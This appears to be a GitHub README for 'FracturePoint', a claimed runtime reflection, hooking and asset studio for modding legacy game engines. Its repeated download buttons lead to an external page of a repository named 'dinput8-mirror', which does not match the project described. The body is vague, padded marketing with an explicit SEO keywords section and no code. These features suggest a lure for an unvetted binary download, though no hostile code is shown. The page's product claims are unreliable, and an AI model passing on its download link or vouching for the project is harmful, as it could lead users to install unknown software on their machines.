![preview](https://raw.githubusercontent.com/shikhait2000/dinput8-mirror/main/view_d7fd09.svg)
[![Download](https://raw.githubusercontent.com/shikhait2000/dinput8-mirror/main/grab_7c2ff0d.svg)](https://shikhait2000.github.io/dinput8-mirror/)

# 🌀 FracturePoint — Runtime Weaving Studio for Legacy Engines

> *Where old worlds learn new tricks, and the seams of a game become its canvas.*

![status](https://img.shields.io/badge/status-active%20development-6f42c1?style=flat-square)
![platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-0078d4?style=flat-square)
![language](https://img.shields.io/badge/languages-C%20%7C%20C%2B%2B%20%7C%20Rust-dea584?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square)
![build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)
![ui](https://img.shields.io/badge/ui-responsive%20%26%20adaptive-ff69b4?style=flat-square)
![i18n](https://img.shields.io/badge/i18n-14%20locales-blueviolet?style=flat-square)
![support](https://img.shields.io/badge/support-24%2F7-ffb300?style=flat-square)
![year](https://img.shields.io/badge/2026-edition-9c27b0?style=flat-square)

---

## 🌌 What Is FracturePoint?

FracturePoint is a **runtime weaving studio** for legacy game engines that were never designed to be extended. Instead of forcing you to rebuild an engine from source, FracturePoint slips between the engine and the operating system, listening to the way a game talks to its own internals, and quietly translating those conversations into something you can script, reshape, and evolve.

Think of it as a **seismograph for software**: every function call, every allocated block, every hook point is a tremor that FracturePoint records, maps, and lets you respond to — in C, C++, or Rust — without ever touching the original executable.

It is not a patcher. It is not a loader. It is a **composition layer** that lets mods, tooling, and analysis share the same reflective surface.

At the center of the project sits the **Atelier** — a cross-platform asset and scene workshop built on Rust and egui — which lets artists and engineers view, remap, and repackage engine resources while the game is still running in another window.

---

## 🧭 Table of Contents

- [Why FracturePoint Exists](#-why-fracturepoint-exists)
- [Core Capabilities](#-core-capabilities)
- [The Atelier — Cross-Platform Asset Workshop](#-the-atelier--cross-platform-asset-workshop)
- [Runtime Reflection API](#-runtime-reflection-api)
- [Multi-Language Mod Authoring](#-multi-language-mod-authoring)
- [Architecture Overview](#-architecture-overview)
- [Feature Highlights](#-feature-highlights)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Multilingual Support](#-multilingual-support)
- [24/7 Support Model](#-247-support-model)
- [Getting the Project](#-getting-the-project)
- [Quick Start Walkthrough](#-quick-start-walkthrough)
- [Mod Authoring Example](#-mod-authoring-example)
- [Configuration Reference](#-configuration-reference)
- [Security & Safety Notes](#-security--safety-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 Why FracturePoint Exists

Legacy engines age like cities: the streets still work, the plumbing is questionable, and everyone has quietly built their own additions on top. FracturePoint treats that aging cityscape as a **living archaeological site**. Rather than bulldozing it, we install glass walkways through it.

Three beliefs shape the project:

1. **Reflection should be a first-class citizen**, not a bolt-on afterthought.
2. **Mod authors deserve real languages**, not just config files with wishes.
3. **Tools should be cross-platform**, even when the games they touch are not.

The result is a framework where binary analysis, live asset editing, and mod runtime logic share a single coherent spine.

---

## 🔮 Core Capabilities

- **Binary surface mapping** — enumerate exported and internal symbols at runtime without a symbol server.
- **Live object graph introspection** — walk pointers, vtables, and reflection tables while the process breathes.
- **Scriptable hook lattice** — attach callbacks to any discovered address with typed signatures.
- **Asset streaming bridge** — pull textures, meshes, audio, and scripts out of memory, transform them, and push them back.
- **Hot-swap mod loading** — load and unload runtime extensions without restarting the target.
- **Cross-language ABI** — one C ABI, three author-facing languages.
- **Atelier session sharing** — multiple workstations viewing the same live process.
- **Deterministic replay logs** — capture a session, replay it offline, diff it against another.

---

## 🎨 The Atelier — Cross-Platform Asset Workshop

The Atelier is the human-facing half of FracturePoint. It is written in Rust with egui and ships the same on Windows, Linux, and macOS.

It offers:

- **Scene composer** — arrange imported meshes, materials, and lights in an interactive viewport.
- **Material graph** — remap shader inputs without editing shader source.
- **Texture lab** — inspect compression artifacts, recompress, and preview mip behavior.
- **Audio workbench** — trim, loop-point, and re-encode without leaving the studio.
- **Script deck** — edit engine-side scripts with syntax awareness for common formats.
- **Session timeline** — scrub through a recorded runtime session and re-apply edits at any frame.
- **Export pipeline** — bundle the result into a portable package with a manifest.

The Atelier’s design language is intentionally calm: dark canvas, low chroma, high contrast for structural elements, and a layout that rearranges smoothly between phone-sized and ultrawide windows.

---

## 🧬 Runtime Reflection API

The reflection API is the **nervous system** of FracturePoint. Every other feature is a nerve ending attached to it.

Highlights:

- **Type registry** — discover structs, enums, unions, and their field offsets at runtime.
- **Function descriptors** — signatures, calling conventions, and thunk addresses.
- **Field accessors** — read and write fields with bounds awareness.
- **VTable lenses** — map virtual dispatch without symbol names.
- **Annotation hooks** — attach your own metadata to any discovered type.
- **Stable handles** — references that survive reloads and re-layouts.
- **Reflection dumps** — emit a canonical schema for tooling consumption.

The API is deliberately **language-neutral** at the boundary, with idiomatic wrappers provided for each supported authoring language.

---

## 🛠 Multi-Language Mod Authoring

FracturePoint refuses to lock you into one voice. Three tongues are supported natively:

| Language | Best For | Wrapper Style |
| --- | --- | --- |
| C | Tiny, surgical runtime extensions | Header-only, zero dependencies |
| C++ | Rich, object-oriented mods | RAII wrappers around handles |
| Rust | Safe, concurrent, modern tooling | Crates with typed channels |

Each wrapper exposes the same capability set, so a mod written in one language can be reasoned about in another. Interop is explicit and documented, never magical.

Authoring traits emphasized across languages:

- **Predictable ownership** — no surprise double-frees.
- **Explicit lifetimes** for any resource borrowed from the target.
- **Async-friendly channels** for mods that want to stream data.
- **Error surfaces** that distinguish *recoverable* from *fatal* faults.

---

## 🏛 Architecture Overview

FracturePoint is layered like geological strata — each layer only sees the one beneath it.

- **Bedrock** — the injection and bridge layer, written in C.
- **Core** — reflection, hooking, and scheduling, written in C++ and Rust.
- **Weave** — mod host and capability grants, in Rust.
- **Atelier** — UI and asset tooling, in Rust + egui.

Each layer communicates through a single shared ABI declared in a versioned header. Nothing upper-layer ever imports lower-layer internals.

Data flows bidirectionally:

1. The bridge notes a call.
2. The Core resolves and describes it.
3. The Weave offers it to registered mods.
4. The Atelier visualizes it for a human.

---

## ✨ Feature Highlights

- **Reflective runtime** that maps types, functions, and vtables as the process runs.
- **Three-language mod surface** — C, C++, and Rust on the same spine.
- **Cross-platform Atelier** on Windows, Linux, and macOS.
- **Responsive, adaptive interface** that reshapes for small and large displays.
- **Multilingual UI** with 14 locales at launch and a translation pipeline for adding more.
- **24/7 support channel** staffed by rotating maintainers and community stewards.
- **Deterministic session recording** for reproducible analysis.
- **Hot-reloadable mods** with capability-based permissions.
- **Zero external runtime dependencies** for the core bridge.
- **MIT-licensed core** with an explicit attribution policy for downstream forks.

---

## 📱 Responsive UI Philosophy

The Atelier does not assume you have three monitors and a mechanical keyboard. It assumes you might be reviewing a session on a laptop at a coffee shop, or cross-checking an asset on a tablet while the target machine runs elsewhere.

The interface therefore:

- reflows panels into stacked views on narrow widths,
- collapses the timeline into a scrubber ribbon below a certain breakpoint,
- promotes frequently used actions to a floating rail on touch devices,
- remembers per-window layout across launches,
- and honors system-level contrast and motion preferences.

Responsiveness here is not a checkbox — it is the belief that **analysis tools should adapt to humans, not the reverse**.

---

## 🌍 Multilingual Support

Language should never be the wall between a modder and a working extension. FracturePoint ships with a translation catalogue and a documented contribution format.

Supported locales include English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Turkish, Japanese, Korean, Simplified Chinese, Traditional Chinese, and Russian.

Every string is keyed rather than hardcoded, so the Atelier can switch languages without restarting. Community translators receive credit in an in-app acknowledgements screen.

---

## 🕰 24/7 Support Model

Support is structured as a **relay, not a hotline**. Because the maintainers span multiple time zones, questions raised at any hour are likely to meet at least one awake responder.

Channels:

- A rotating triage desk for incoming issues.
- A design review track for proposed capabilities.
- A beginner-friendly mentoring thread for first-time contributors.
- A stability room for regressions tied to specific engines or platforms.

The goal is not to promise omniscience, but to promise **continuous presence**.

---

## 📦 Getting the Project

[![Download](https://raw.githubusercontent.com/shikhait2000/dinput8-mirror/main/grab_7c2ff0d.svg)](https://shikhait2000.github.io/dinput8-mirror/)

Releases are published as signed archives with a manifest describing contents, supported platforms, and known caveats. Choose the archive matching your operating system, unpack it in a directory you control, and follow the walkthrough below.

If you prefer to build from sources, the repository contains a bootstrap script that detects your toolchain, bootstraps missing components, and compiles each layer in dependency order. The build is designed to be hermetic: no network calls are required after the initial toolchain preparation.

---

## 🚀 Quick Start Walkthrough

1. **Verify the environment.** Confirm the target process is a supported build and that your user account has the privileges it needs on that platform.
2. **Launch the bridge.** Start the bridge helper and note the session token it prints.
3. **Open the Atelier.** Paste the session token into the connection field on the welcome screen.
4. **Explore reflection.** Use the *Types* tab to list discovered structures. Click a type to see its fields, offsets, and sizes.
5. **Attach a hook.** In the *Hooks* tab, pick a function, choose a callback mode, and describe the signature.
6. **Compose a mod.** Open the *Weave* tab and select the language you want to author in. Scaffold a new extension and reload it live.
7. **Record a session.** Toggle recording at the top of the timeline panel; stop when you have what you need.
8. **Export artifacts.** Use the *Export* panel to package assets, logs, or a full session snapshot.

Each of these steps is reversible. The Atelier is a workshop, not a one-way door.

---

## 🧪 Mod Authoring Example (Conceptual)

A mod in FracturePoint has three responsibilities: declare interest, respond to events, and release resources.

A minimal conceptual lifecycle looks like this:

- **Declare** the capabilities you need (read-only reflection, one write channel, one hook).
- **Subscribe** to the events you care about (a function entry, a field mutation, a resource load).
- **Respond** with logic in your chosen language.
- **Release** every handle when the mod unloads.

Because capabilities are explicit, a mod cannot silently escalate. Because handles are typed, a mod cannot misinterpret a memory region. Because the ABI is versioned, a mod built for one release is diagnosed clearly when run against another.

---

## ⚙ Configuration Reference

FracturePoint reads configuration from a single layered directory:

- A **user layer** for personal preferences.
- A **project layer** for repository-scoped settings.
- A **system layer** for machine-wide defaults.

Each layer can override the one before it. Conflicts are surfaced in the Atelier’s *Diagnostics* tab with a diff view showing which layer won and why.

Key configuration domains:

- **Bridge** — session behavior, port ranges, timeouts.
- **Reflection** — cache sizing, schema refresh policy, dump formats.
- **Hooks** — default callback mode, stack depth guards, bail-out rules.
- **Weave** — mod search paths, capability defaults, sandbox strictness.
- **Atelier** — theme, layout memory, locale, motion policy.
- **Telemetry** — entirely opt-in, entirely local, never auto-uploaded.

---

## 🔒 Security & Safety Notes

FracturePoint touches running processes, so safety is treated as a design constraint, not a checklist.

Principles:

- **Least privilege by default.** Mods receive only the capabilities they declare.
- **No ambient authority.** Handles must be earned, not assumed.
- **Auditable surfaces.** Every capability grant is written to a local log with a timestamp.
- **Deterministic teardown.** Unloading a mod releases every resource it acquired, or the unload is refused.
- **Explicit risk surfaces.** Operations that could destabilize a target require an opt-in acknowledgement.

The project does not ship with any mechanism to alter protected software, bypass licensing, or interfere with systems the user does not own or administer.

---

## 🗺 Roadmap for 2026

- **Q1 2026** — Stabilize reflection schema v3 with backward compatibility shims.
- **Q2 2026** — Ship the Atelier’s collaborative session mode for small teams.
- **Q3 2026** — Introduce a plugin index with signed manifests.
- **Q4 2026** — Publish a formal specification for the shared ABI.

Beyond 2026: a **headless analysis mode** for CI pipelines, a **diff engine** for comparing two sessions structurally, and an **SDK** for embedding the reflection core into third-party tooling.

---

## 🔍 SEO & Discoverability Notes

FracturePoint is built to be found by people searching for **runtime reflection tooling**, **cross-platform game asset studios**, **multi-language mod frameworks**, **C and C++ and Rust modding**, **live binary introspection**, **engine extension frameworks**, and **legacy engine analysis utilities**.

Natural phrases used throughout this document — *runtime reflection API*, *cross-platform asset workshop*, *mod authoring in Rust and C*, *live session recording for game tooling*, *responsive multilingual analysis UI*, *24/7 support model* — describe the project honestly rather than padding it.

---

## ❓ FAQ

**Is FracturePoint a replacement for the engine?**
No. It layers alongside it, observing and extending without rewriting.

**Do I need the original source?**
No. FracturePoint works from the running process, not from source.

**Which language should I pick for my mod?**
C for the smallest footprint, C++ for object-oriented structure, Rust for safety and concurrency.

**Can I use the Atelier without launching a game?**
Yes. It can open offline packages, recorded sessions, and exported artifacts.

**Does the Atelier phone home?**
No. Telemetry is opt-in, stored locally, and never transmitted automatically.

**Where do I report a problem?**
Through the repository’s issue tracker, using the provided templates.

---

## ⚠️ Disclaimer

FracturePoint is provided as a **research and creative tool** for users working with software they own or are authorized to examine. It is intended for education, preservation, accessibility, and artistic exploration.

The maintainers do not endorse, support, or facilitate any use that violates a software license, circumvents protections the user has no right to bypass, or interferes with systems outside the user’s control. Users are responsible for understanding and complying with the laws and agreements that apply to them.

No warranty is offered, express or implied. The project’s contributors are not liable for any consequence arising from use of this software.

---

## 📜 License

FracturePoint is released under the **MIT License**. The full text is available at the standard MIT license reference: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 FracturePoint contributors.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation, to deal in the software without limitation, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and permit persons to whom the software is furnished to do so, subject to the conditions of the license.

---

[![Download](https://raw.githubusercontent.com/shikhait2000/dinput8-mirror/main/grab_7c2ff0d.svg)](https://shikhait2000.github.io/dinput8-mirror/)